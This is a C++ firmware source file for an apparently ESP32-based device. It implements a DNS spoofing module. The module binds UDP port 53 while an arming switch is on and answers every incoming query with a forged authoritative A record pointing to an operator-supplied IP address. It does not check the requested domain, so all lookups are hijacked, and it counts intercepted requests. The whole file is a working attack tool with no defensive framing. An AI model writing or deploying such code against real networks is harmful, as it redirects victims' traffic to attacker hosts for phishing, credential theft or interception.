#include "dns_spoof.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <WiFiUdp.h>

namespace DNSSpoof {

// Real DNS packet structures
struct __attribute__((packed)) DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;      // Question count
    uint16_t ancount;      // Answer count
    uint16_t nscount;      // Authority count
    uint16_t arcount;      // Additional count
};

// DNS question structure (after header)
// Contains QNAME (variable length, null-terminated labels)
// QTYPE (2 bytes)
// QCLASS (2 bytes)

static WiFiUDP udp;
static bool active = false;
static uint32_t interceptCount = 0;

// Parse DNS domain name from packet (variable length, label format)
static bool parseDNSName(const uint8_t* packet, int packetLen, int offset, String &outName) {
    outName = "";
    int pos = offset;

    while (pos < packetLen) {
        uint8_t len = packet[pos++];
        if (len == 0) break;  // End of name
        if (len & 0xC0) break; // Pointer, not supported in this simple parser

        if (outName.length() > 0) outName += ".";
        for (int i = 0; i < len && pos < packetLen; i++) {
            outName += (char)packet[pos++];
        }
    }

    return pos < packetLen;
}

// Create real DNS response packet
static void sendDNSResponse(const uint8_t* queryPacket, int queryLen,
                           const String &spoofIP, IPAddress clientIP, uint16_t clientPort) {
    if (queryLen < sizeof(DNSHeader)) return;

    DNSHeader* queryHeader = (DNSHeader*)queryPacket;

    // Parse query to get domain name
    String domain;
    parseDNSName(queryPacket, queryLen, sizeof(DNSHeader), domain);

    // Create response packet (max 512 bytes for DNS)
    uint8_t responsePacket[512];
    int responseLen = 0;

    // Copy and modify header
    DNSHeader* respHeader = (DNSHeader*)responsePacket;
    respHeader->id = queryHeader->id;           // Match query ID
    respHeader->flags = htons(0x8400);          // Response flag, QR=1, Opcode=0, AA=1
    respHeader->qdcount = queryHeader->qdcount; // Same question count
    respHeader->ancount = htons(1);             // 1 answer
    respHeader->nscount = 0;
    respHeader->arcount = 0;

    responseLen = sizeof(DNSHeader);

    // Copy question section from query
    int qOffset = sizeof(DNSHeader);
    int qEnd = qOffset;

    // Find end of question section (look for QTYPE and QCLASS)
    while (qEnd < queryLen && queryPacket[qEnd] != 0) {
        if (queryPacket[qEnd] & 0xC0) break;
        qEnd += queryPacket[qEnd] + 1;
    }
    qEnd += 5; // Skip null byte + QTYPE (2) + QCLASS (2)

    // Copy question to response
    if (qEnd <= queryLen && qEnd - qOffset <= 256) {
        memcpy(responsePacket + responseLen, queryPacket + qOffset, qEnd - qOffset);
        responseLen += (qEnd - qOffset);
    }

    // Add answer section (Name, Type=A, Class=IN, TTL, RDLENGTH, RDATA)
    responsePacket[responseLen++] = 0xC0;  // Name pointer (to question)
    responsePacket[responseLen++] = 0x0C;  // Offset 12 (start of question section)

    responsePacket[responseLen++] = 0x00;  // Type A (host address)
    responsePacket[responseLen++] = 0x01;

    responsePacket[responseLen++] = 0x00;  // Class IN (internet)
    responsePacket[responseLen++] = 0x01;

    // TTL (32-bit, 300 seconds = 0x0000012C)
    responsePacket[responseLen++] = 0x00;
    responsePacket[responseLen++] = 0x00;
    responsePacket[responseLen++] = 0x01;
    responsePacket[responseLen++] = 0x2C;

    // RDLENGTH (2 bytes, 4 for IPv4)
    responsePacket[responseLen++] = 0x00;
    responsePacket[responseLen++] = 0x04;

    // Parse spoofed IP and add as RDATA
    IPAddress ip;
    ip.fromString(spoofIP);
    for (int i = 0; i < 4; i++) {
        responsePacket[responseLen++] = ip[i];
    }

    // Send response via UDP
    udp.beginPacket(clientIP, clientPort);
    udp.write(responsePacket, responseLen);
    udp.endPacket();

    interceptCount++;
}

SpoofResult start(const String &domain, const String &spoofIP, uint16_t timeoutMs) {
    SpoofResult result{false, domain, spoofIP, 0};

    if (!TxArm::isArmed()) {
        return result;
    }

    // Start UDP listening on port 53
    if (!udp.begin(53)) {
        return result;
    }

    active = true;
    interceptCount = 0;

    unsigned long startTime = millis();
    unsigned long endTime = startTime + timeoutMs;

    while (millis() < endTime && active && TxArm::isArmed()) {
        int packetSize = udp.parsePacket();

        if (packetSize > 0 && packetSize < 512) {
            // Read packet
            uint8_t packet[512];
            udp.read(packet, packetSize);

            // Get client info
            IPAddress clientIP = udp.remoteIP();
            uint16_t clientPort = udp.remotePort();

            // Check if packet contains DNS query
            if (packetSize >= sizeof(DNSHeader)) {
                DNSHeader* header = (DNSHeader*)packet;
                uint16_t flags = ntohs(header->flags);

                // If QR bit is 0 (query), send response
                if ((flags & 0x8000) == 0) {
                    sendDNSResponse(packet, packetSize, spoofIP, clientIP, clientPort);
                }
            }
        }

        delay(10);
    }

    result.active = true;
    result.requestsIntercepted = interceptCount;
    stop();

    return result;
}

void stop() {
    if (active) {
        udp.stop();
        active = false;
    }
}

uint32_t getInterceptedRequests() {
    return interceptCount;
}

} // namespace DNSSpoof
